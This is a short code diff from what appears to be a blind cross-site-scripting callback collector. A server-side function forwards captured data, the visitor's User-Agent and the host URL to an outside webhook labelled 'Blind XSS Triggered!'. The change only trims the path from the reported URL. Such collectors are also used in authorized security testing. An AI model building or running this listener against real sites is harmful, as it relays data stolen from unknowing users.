@@ -9,7 +9,7 @@ export async function getServerSideProps(context) {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        content: `📢 Blind XSS Triggered!\nData: ${JSON.stringify(data)}\nUser-Agent: ${userAgent}\nURL: https://${context.req.headers.host}${context.req.url}`,
+        content: `📢 Blind XSS Triggered!\nData: ${JSON.stringify(data)}\nUser-Agent: ${userAgent}\nURL: https://${context.req.headers.host}`,
       }),
     }).catch(() => {});
   }
